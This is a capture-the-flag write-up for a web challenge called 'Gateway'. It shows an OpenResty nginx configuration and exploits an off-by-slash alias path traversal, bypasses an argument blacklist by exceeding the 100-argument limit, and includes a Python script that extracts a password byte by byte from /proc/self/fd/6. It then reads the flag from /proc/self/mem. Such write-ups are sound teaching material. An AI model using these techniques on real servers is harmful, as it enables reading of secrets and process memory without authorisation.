---
description: nginx misconfig
---

# Gateway

<figure><img src="../../../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

given a web link with the source code. First we see the web

<figure><img src="../../../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

nothing much to see here. Then I proceed to analyze the source code

<figure><img src="../../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

ignore the py files, those are my scripts. Anyway as you can see, we are given a Dockerfile and an nginx conf file.

Dockerfile:

```docker
FROM openresty/openresty:alpine

COPY ./nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
COPY ./www /www
RUN echo "hacktoday{test}" > /flag
RUN echo "test" > /password

EXPOSE 80

CMD ["sh", "-c", "openresty -g 'daemon off;'"]
```

we see here it is an openresty image with nginx conf

nginx.conf:

```nginx
events {
    worker_connections 8192;
}

http {
    include mime.types;
    default_type text/html;
    access_log off;
    error_log /dev/null;
    sendfile on;

    init_by_lua_block {
        u = io.open("/flag", "r")
        v = io.open("/password", "r")
        x = u:read("*all")
        y = v:read("*all")
        u:close()
        password = string.gsub(y, "[\n\r]", "")
        os.remove("/flag")
        os.remove("/password")
    }

    server {
        listen 80 default_server;
        location / {
            content_by_lua_block {
                ngx.say("ok")
            }
        }

        location /static {
            alias /www/;
            access_by_lua_block {
                if ngx.var.remote_addr ~= "127.0.0.1" then
                    ngx.exit(403)
                end
            }
            add_header Accept-Ranges bytes;
        }

        location /download {
            access_by_lua_block {
                local blacklist = {"%.", "/", ";", "flag", "proc"}
                local args = ngx.req.get_uri_args()
                for k, v in pairs(args) do
                    for _, b in ipairs(blacklist) do
                        if string.find(v, b) then
                            ngx.exit(403)
                        end
                    end
                end
            }
            add_header Content-Disposition "attachment; filename=download.txt";
            proxy_pass http://127.0.0.1/static$arg_filename;
            body_filter_by_lua_block {
                local blacklist = {"flag", "hacktoday", "CTF", "password", "secret", "pass"}
                for _, b in ipairs(blacklist) do
                    if string.find(ngx.arg[1], b) then
                        ngx.arg[1] = string.rep("*", string.len(ngx.arg[1]))
                    end
                end
            }
        }

        location /read {
            access_by_lua_block {
                if ngx.var.http_x_password ~= password then
                    ngx.say("go find the password first!")
                    ngx.exit(403)
                end
            }
            content_by_lua_block {
                local f = io.open(ngx.var.http_x_filename, "r")
                if not f then
                    ngx.exit(404)
                end
                local start = tonumber(ngx.var.http_x_start) or 0
                local length = tonumber(ngx.var.http_x_length) or 1024
                if length > 1024 * 1024 then
                    length = 1024 * 1024
                end
                f:seek("set", start)
                local content = f:read(length)
                f:close()
                ngx.say(content)
                ngx.header["Content-Type"] = "application/octet-stream"
            }
        }
    }
}
```

```nginx
   init_by_lua_block {
        u = io.open("/flag", "r")
        v = io.open("/password", "r")
        x = u:read("*all")
        y = v:read("*all")
        u:close()
        password = string.gsub(y, "[\n\r]", "")
        os.remove("/flag")
        os.remove("/password")
    }
```

from here we see that the '/flag' and '/password' file is read and assigned to 'u' and 'v' variable. Then the 'flag' is closed and both files are removed. Keep in my mind that 'password' **has not been closed**, which will enable us to read the file descriptor to read the contents. As for the 'flag' we have to read it in memory.

```nginx
       location /static {
            alias /www/;
            access_by_lua_block {
                if ngx.var.remote_addr ~= "127.0.0.1" then
                    ngx.exit(403)
                end
            }
            add_header Accept-Ranges bytes;
        }
```

here we see we can do Path Traversal cause of Off-By-Slash nginx misconfig, [https://medium.com/@\_sharathc/unveiling-the-off-by-one-slash-vulnerability-in-nginx-configurations-c05b3b7b7c1e](https://medium.com/@_sharathc/unveiling-the-off-by-one-slash-vulnerability-in-nginx-configurations-c05b3b7b7c1e) this article explains it good.

but we can't access it remotely cause we will be blocked by **access\_by\_lua\_block** unless it is from localhost.

```nginx
        location /download {
            access_by_lua_block {
                local blacklist = {"%.", "/", ";", "flag", "proc"}
                local args = ngx.req.get_uri_args()
                for k, v in pairs(args) do
                    for _, b in ipairs(blacklist) do
                        if string.find(v, b) then
                            ngx.exit(403)
                        end
                    end
                end
            }
            add_header Content-Disposition "attachment; filename=download.txt";
            proxy_pass http://127.0.0.1/static$arg_filename;
            body_filter_by_lua_block {
                local blacklist = {"flag", "hacktoday", "CTF", "password", "secret", "pass"}
                for _, b in ipairs(blacklist) do
                    if string.find(ngx.arg[1], b) then
                        ngx.arg[1] = string.rep("*", string.len(ngx.arg[1]))
                    end
                end
            }
        }
```

then we see here there's a gateway to access /static from /download but there are a lot of restrictions.

```nginx
location /read {
            access_by_lua_block {
                if ngx.var.http_x_password ~= password then
                    ngx.say("go find the password first!")
                    ngx.exit(403)
                end
            }
            content_by_lua_block {
                local f = io.open(ngx.var.http_x_filename, "r")
                if not f then
                    ngx.exit(404)
                end
                local start = tonumber(ngx.var.http_x_start) or 0
                local length = tonumber(ngx.var.http_x_length) or 1024
                if length > 1024 * 1024 then
                    length = 1024 * 1024
                end
                f:seek("set", start)
                local content = f:read(length)
                f:close()
                ngx.say(content)
                ngx.header["Content-Type"] = "application/octet-stream"
            }
        }
```

finally we see a /read endpoint. Basically this endpoint will require a **X-Password** Header to access a filename which we defined by **X-Filename**. Then we can specify where the bytes start and the range of bytes using **X-Start** and **X-Length.**

Now for the exploit part. First we use path traversal to find the password file. We can use /download endpoint but it got so much restrictions, which turns out there's a way to bypass all of the restrictions. How? by giving so much arguments until it can't handle the arguments.

{% embed url="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/" %}

here it is stated that the maximum request arguments is 100. So using thsi script we make 100 request arguments then add the filename

```python
vals = ''
for i in range (1, 101):
    vals += str(i) + '=' + str(i) + '&'

print(vals)
```

<figure><img src="../../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

it worked! now we just have to read the fd where password is located. We know the password is located in **/proc/self/fd/6** from container debugging.

<figure><img src="../../../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

and as we can see the password text are all asterisks, which means it contain /download filename restrictions. we can bypass this by only retrieve 1 byte at a time. My script:

```python
import requests

# 1. Siapkan Variabel Awal
# Ganti dengan URL lengkap Anda yang berisi >100 parameter
url_target = "http://103.160.212.3:13810/download?1=1&2=2&3=3&4=4&5=5&6=6&7=7&8=8&9=9&10=10&11=11&12=12&13=13&14=14&15=15&16=16&17=17&18=18&19=19&20=20&21=21&22=22&23=23&24=24&25=25&26=26&27=27&28=28&29=29&30=30&31=31&32=32&33=33&34=34&35=35&36=36&37=37&38=38&39=39&40=40&41=41&42=42&43=43&44=44&45=45&46=46&47=47&48=48&49=49&50=50&51=51&52=52&53=53&54=54&55=55&56=56&57=57&58=58&59=59&60=60&61=61&62=62&63=63&64=64&65=65&66=66&67=67&68=68&69=69&70=70&71=71&72=72&73=73&74=74&75=75&76=76&77=77&78=78&79=79&80=80&81=81&82=82&83=83&84=84&85=85&86=86&87=87&88=88&89=89&90=90&91=91&92=92&93=93&94=94&95=95&96=96&97=97&98=98&99=99&100=100&filename=../proc/self/fd/6"
password_lengkap = ""
total_bytes = 59

print("Memulai proses ekstraksi karakter...")

# 2. Buat Perulangan
for i in range(total_bytes):
    # 3. Di Dalam Loop

    # Buat header Range untuk byte ke-i
    range_header_value = f"bytes={i}-{i}"

    # Siapkan semua header yang diperlukan
    headers = {
        'Host': '103.160.212.3:13810',
        'User-Agent': 'My-Cool-Automation-Script/1.0',
        'Range': range_header_value
        # Anda bisa menambahkan header lain jika perlu
    }

    try:
        # Kirim permintaan
        response = requests.get(url_target, headers=headers, timeout=5)

        # Periksa apakah permintaan berhasil
        if response.status_code == 206:
            karakter = response.text
            print(f"Byte {i}: '{karakter}'")

            # Gabungkan hasil
            password_lengkap += karakter
        else:
            print(f"Gagal mengambil byte {i}: Status {response.status_code}")
            break # Hentikan jika ada error

    except requests.exceptions.RequestException as e:
        print(f"Terjadi error pada permintaan: {e}")
        break

# 4. Setelah Loop Selesai
print("\nProses selesai!")
print(f"Password yang berhasil diekstrak: {password_lengkap}")
```

when we run the script, we got the password:

<figure><img src="../../../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>

**Password: passthepasswordisdontlookbehindpasswordsomethingiswatching**

Now after we got the password we can access /read endpoint. first we see **/proc/self/maps** to see the memory layout

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

we see **/dev/zero** is located in **0x7faf57b10000**, now we can use offset with **/proc/self/mem** to dump memory

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

and we got the flag

#### Flag: hacktoday{g4t3w4y\_m1sc0nf1gur4t10n\_c0z\_tr0ubl3}
